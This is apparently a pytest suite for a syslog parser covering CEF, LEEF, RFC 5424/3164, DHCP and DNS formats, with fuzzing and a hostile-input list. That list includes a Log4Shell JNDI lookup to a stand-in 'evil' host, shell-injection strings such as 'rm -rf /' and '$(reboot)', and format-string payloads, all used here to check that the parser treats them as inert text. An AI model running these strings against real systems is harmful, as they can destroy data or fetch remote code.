"""Every syslog parser, including hostile input (SR-24/25)."""
# ruff: noqa: S311  (deterministic fuzzing, not cryptography)
from __future__ import annotations

import random
import string
import time

import pytest
import syslog_sender as ss

from exp_runner.syslog_parse import MAX_RAW, parse_line

NOW = 1_795_000_000.0
SRC, DST, MAC, HOST = "10.60.14.77", "10.0.0.10", "f0:18:98:aa:bb:01", "alices-iphone"


def build(fmt, env="5424"):
    return ss.build(fmt, src=SRC, dst=DST, mac=MAC, hostname=HOST, ts=NOW, envelope=env)


@pytest.mark.parametrize("env", ["5424", "3164", "none"])
def test_cef_every_envelope(env):
    p = parse_line(build("cef", env), NOW)
    assert (p.fmt, p.kind) == ("cef", "security")
    f = p.fields
    assert (f["src_ip"], f["dst_ip"], f["dst_port"], f["src_port"], f["proto"], f["action"]) == (SRC, DST, 22, 51234, "tcp", "deny")
    assert (f["zone_from"], f["zone_to"], f["category"]) == ("Guest", "Mgmt", "zbf")
    assert p.ips == (SRC, DST)


@pytest.mark.parametrize("env", ["5424", "3164", "none"])
def test_leef_every_envelope(env):
    p = parse_line(build("leef", env), NOW)
    assert (p.fmt, p.kind, p.fields["action"], p.fields["src_ip"], p.fields["dst_port"]) == ("leef", "security", "deny", SRC, 22)


def test_leef_1_0_tab_and_custom_delimiter():
    one = ss.leef(version_major=1, attrs={"src": SRC, "dst": DST, "action": "drop"})
    two = ss.leef(version_major=2, delimiter="^", attrs={"src": SRC, "dst": DST, "action": "block"})
    assert parse_line(one, NOW).fields["action"] == "drop"
    p = parse_line(two, NOW)
    assert p.fields["action"] == "block" and p.fields["dst_ip"] == DST


@pytest.mark.parametrize("env", ["5424", "3164", "none"])
def test_key_value_and_ec_firewall(env):
    p = parse_line(build("kv", env), NOW)
    assert (p.fmt, p.kind, p.fields["action"], p.fields["dst_port"]) == ("kv", "security", "deny", 22)
    e = parse_line(build("ec", env), NOW)
    assert e.kind == "security" and e.fields["action"] == "drop" and e.fields["rule"] == "deny-guest-to-mgmt"
    assert (e.fields["zone_from"], e.fields["zone_to"], e.fields["category"]) == ("Guest", "Mgmt", "zbf")


def test_ec_zbf_flow_style():
    p = parse_line(ss.ec_firewall(style="flow"), NOW)
    assert p.kind == "security" and p.fields["action"] == "drop" and p.fields["src_port"] == 51234 and p.fields["zone_to"] == "Mgmt"


def test_rfc5424_structured_data_with_escapes():
    line = ss.rfc5424_message("fw event", ts=NOW, msgid="FW",
                             sd={"exp@32473": {"action": "deny", "src": SRC, "dst": DST, "rule": 'a "quoted] rule\\'}})
    p = parse_line(line, NOW)
    assert p.fmt == "rfc5424" and p.kind == "security"
    assert p.fields["rule"] == 'a "quoted] rule\\' and p.fields["action"] == "deny"
    assert p.ts_source == "message" and abs(p.ts - NOW) < 1


def test_rfc3164_header_and_year_rollover():
    line = ss.rfc3164_message("action=deny src=10.1.1.1 dst=10.2.2.2", ts=NOW, host="fw1", tag="fw")
    p = parse_line(line, NOW)
    assert p.header_host == "fw1" and p.ts_source == "message" and abs(p.ts - NOW) < 1


def test_untrusted_message_timestamp_falls_back_to_receive_time():
    far = ss.rfc3164_message("action=deny src=10.1.1.1 dst=10.2.2.2", ts=NOW - 86400 * 3, host="fw1")
    p = parse_line(far, NOW)
    assert p.ts == NOW and p.ts_source == "received"


@pytest.mark.parametrize("env", ["5424", "3164", "none"])
@pytest.mark.parametrize("fmt", ["isc", "kea", "windows"])
def test_dhcp_lease_bindings(fmt, env):
    p = parse_line(build(fmt, env), NOW)
    assert (p.fmt, p.kind) == ("dhcp", "dhcp")
    assert p.fields["mac"] == MAC and p.fields["lease_ip"] == SRC and p.fields["dhcp_event"] == "ack"
    assert p.ips == (SRC,)
    if fmt != "kea":
        assert p.fields["hostname"] == HOST


def test_dhcp_release_and_non_binding_events():
    rel = parse_line(ss.dhcp_isc("DHCPRELEASE", SRC, MAC, HOST), NOW)
    assert rel.kind == "dhcp" and rel.fields["dhcp_event"] == "release"
    win = parse_line(ss.dhcp_windows(12, SRC, MAC, HOST, ts=NOW), NOW)
    assert win.fields["dhcp_event"] == "release"
    for ev in ("DHCPDISCOVER", "DHCPOFFER", "DHCPREQUEST"):
        p = parse_line(ss.dhcp_isc(ev, SRC, MAC, HOST), NOW)
        assert p.kind != "dhcp" or p.fields["dhcp_event"] != "ack"
    renew = parse_line(ss.dhcp_windows(11, SRC, MAC, HOST, ts=NOW), NOW)
    assert renew.fields["dhcp_event"] == "ack"


def test_dns_query_logs():
    bind = parse_line("<14>Nov 18 10:00:00 ns1 named[1]: client @0x7f 10.60.14.77#4444 (example.com): query: example.com IN A +E(0)K (10.0.0.1)", NOW)
    assert bind.kind == "dns" and bind.fields["qname"] == "example.com" and bind.fields["client_ip"] == SRC
    dm = parse_line("dnsmasq[22]: query[AAAA] foo.example.net from 10.60.14.77", NOW)
    assert dm.kind == "dns" and dm.fields["qtype"] == "AAAA"
    kv = parse_line("qname=slow.example.org qtype=A rcode=SERVFAIL rtt_ms=1800 src=10.60.14.77", NOW)
    assert kv.kind == "dns" and kv.fields["rcode"] == "SERVFAIL" and kv.fields["rtt_ms"] == 1800.0


def test_unknown_format_is_bounded_raw_with_ip_and_timestamp():
    p = parse_line("Something odd happened for 10.60.14.77 at the edge " + "x" * 5000, NOW)
    assert (p.fmt, p.kind) == ("raw", "other") and p.ips == (SRC,) and p.ts == NOW
    assert len(p.raw) <= MAX_RAW and p.fields == {}


def test_action_normalization_and_categories():
    cases = {"blocked": "block", "DENIED": "deny", "session-limit": "limit", "reset-both": "reset", "pass": "allow", "weird": "other"}
    for raw, want in cases.items():
        assert parse_line(f"action={raw} src=10.1.1.1 dst=10.2.2.2", NOW).fields["action"] == want
    url = parse_line("CEF:0|V|P|1|100|Web filter|5|act=block src=10.1.1.1 dst=1.2.3.4 cat=url dhost=speed.cloudflare.com", NOW)
    assert url.fields["category"] == "url" and url.fields["host"] == "speed.cloudflare.com"
    lim = parse_line("action=limit src=10.1.1.1 reason=session-limit-exceeded", NOW)
    assert lim.fields["category"] == "session_limit"


# ----------------------------------------------------------------------------------- hostile input
HOSTILE = [
    "", " ", "\x00" * 100, "\x1b[31mred\x1b[0m src=10.1.1.1", "<" * 5000, "<999>1 " + "a " * 3000,
    "CEF:0|" + "|" * 200, "CEF:0|a|b|c|d|e|f|" + "k=" * 3000, "LEEF:2.0|" + "x|" * 100, "LEEF:1.0|a|b|c|d|\t" * 20,
    "<165>1 2026-11-18T14:02:12Z h a p m [" + "x=\"" * 2000, "<165>1 2026-11-18T14:02:12Z h a p m [id " + "k=\"v\" " * 5000 + "]",
    "[" * 10000, "a=" + "b" * 100000, "src=" + "1" * 5000, "%s%s%s%n" * 100, "${jndi:ldap://evil/x} src=10.1.1.1 dst=10.1.1.2 action=deny",
    "$(reboot) `reboot` ; rm -rf / src=10.1.1.1 action=deny", "\ud800" if False else "�" * 500, "10.0.0.1 " * 5000,
    "action=" + '"' * 1000, 'a="' + "\\" * 5001, "DHCPACK on 999.1.1.1 to zz:zz:zz:zz:zz:zz", "1,11/18/26,14:02:01,Assign,1.2.3.4,h," + "F" * 5000,
]


@pytest.mark.parametrize("line", HOSTILE)
def test_hostile_lines_never_crash_and_stay_bounded(line):
    t0 = time.perf_counter()
    p = parse_line(line, NOW)
    assert time.perf_counter() - t0 < 1.0
    assert len(p.raw) <= MAX_RAW
    assert "\x00" not in p.raw and "\x1b" not in p.raw
    for v in p.fields.values():
        if isinstance(v, str):
            assert len(v) <= 512 and not any(ord(c) < 32 and c != "\t" for c in v)
    assert len(p.ips) <= 4 or p.kind != "other"


def test_log4shell_and_shell_metacharacters_are_inert_text():
    p = parse_line("${jndi:ldap://evil/x} src=10.1.1.1 dst=10.1.1.2 action=deny reason=\"$(touch /tmp/pwn)\"", NOW)
    assert p.fields["reason"] == "$(touch /tmp/pwn)"


def test_random_fuzz_never_raises():
    rng = random.Random(1234)
    alphabet = string.printable + "<>[]|=\\\"'äö\x00\x1f"
    for _ in range(3000):
        n = rng.randint(0, 400)
        parse_line("".join(rng.choice(alphabet) for _ in range(n)), NOW)
    # structured fragments glued randomly
    frags = ["CEF:0|", "LEEF:2.0|", "<13>1 ", "[x ", 'k="v"', "src=1.2.3.4", "DHCPACK on ", "10.0.0.1", "\t", "|", "\\", " "]
    for _ in range(3000):
        parse_line("".join(rng.choice(frags) for _ in range(rng.randint(1, 30))), NOW)


def test_invalid_ips_are_not_indexed():
    p = parse_line("action=deny src=999.999.1.1 dst=300.1.1.1", NOW)
    assert p.ips == () or all("999" not in i for i in p.ips)
